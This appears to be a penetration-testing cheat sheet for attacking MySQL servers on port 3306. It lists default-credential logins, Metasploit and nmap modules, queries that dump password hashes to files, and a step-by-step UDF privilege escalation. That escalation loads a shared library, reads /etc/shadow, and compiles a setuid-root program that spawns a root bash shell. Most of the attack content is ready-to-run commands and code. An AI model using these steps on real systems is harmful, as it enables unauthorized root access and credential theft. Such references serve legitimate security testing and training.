# 3306 - MySQL

The default account for MySQL is `root` without password

* **Generic** : `dbeaver -h`
* **mysql** `mysql -u <USER> -p<PASSWORD> -h <IP>`
  * List all the databases through `show databases;`
  * List all the tables through `show tables;`
  * Get the hostname `SELECT @@hostname`
  * Get the version `SELECT user();`
* **metasploit plugins** :
  * `auxiliary/admin/mysql/mysql_enum`
  * `auxiliary/admin/mysql/mysql_sql`
  * `auxiliary/scanner/mysql/mysql_login`



* Dump users and password: `select * from mysql.user;`
* Check user privileges: `select * from mysql.user where user = substring_index(user(), '@', 1) ;`
* Get the version of the OS and the architecture: `select @@version_compile_os, @@version_compile_machine;`
* **nmap NSE** : `sudo nmap -p1433 -vvv --script "ms-sql*"`
  * `sudo nmap -Pn -sS -sV -p<PORT> -vvv --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=<PASSWORD> <IP>`
* **User Defined Functions** (UDF)
  * DLLs containing functions called from MySQL. The point here is to download a DLL containing code on the targeted workstation.
  * To know the plugin folder where you have to download your .DLL: `select @@plugin_dir ;`
  * To upload the .DLL file: `select load_file('\\\\<UNC>\\<PATH>\\<FILE>.dll') into dumpfile "<PATH>\\<TO>\\<PLUGINS>";`
  *   Example for code execution :

      ```
      mysql> use mysql;
      mysql> create table foo1(line blob);
      mysql> insert into foo1 values(load_file('/tmp/1518-1.so'));
      mysql> select * from foo1 into dumpfile '/usr/lib/1518-1.so';
      mysql> create function do_system returns integer soname '1518-1.so';
      mysql> select * from mysql.func;
      mysql> select do_system('cat /etc/shadow  > /tmp/out1; chown j0hn.j0hn /tmp/out1');
      mysql> \! sh
      sh-3.2$ cat /tmp/out1       
      ```
  *   Example to get a reverse shell

      * This program set the UID/GID at 0 (root user) then it start a bash in the root context

      ```
      #include <stdio.h>
      #include <stdlib.h>
      #include <unistd.h>
      int main(int argc, char *argv[])
      {
      	setuid(0); setgid(0); system("/bin/bash");
      }    
      ```

      * Compilation of the program and add the S bit to the executable

      ```
      mysql> select do_system('gcc -o /tmp/setuid /tmp/setuid.c');
      mysql> select do_system('chmod u+s /tmp/setuid');   
      ```

      * The program should have the following rights `-rwsrwx--x`, start the program in the current user context : `./setuid`

To dump passwords:

* MySQL4.1 / MySQL5+:&#x20;
  * \`SELECT User, Password FROM mysql.user INTO OUTFILE ‘/tmp/hash.txt’ ;\`
* MSSQL(2012/2014):&#x20;
  * \`SELECT SL.name,SL.password\_hash FROM sys.sql\_logins AS SL;\`
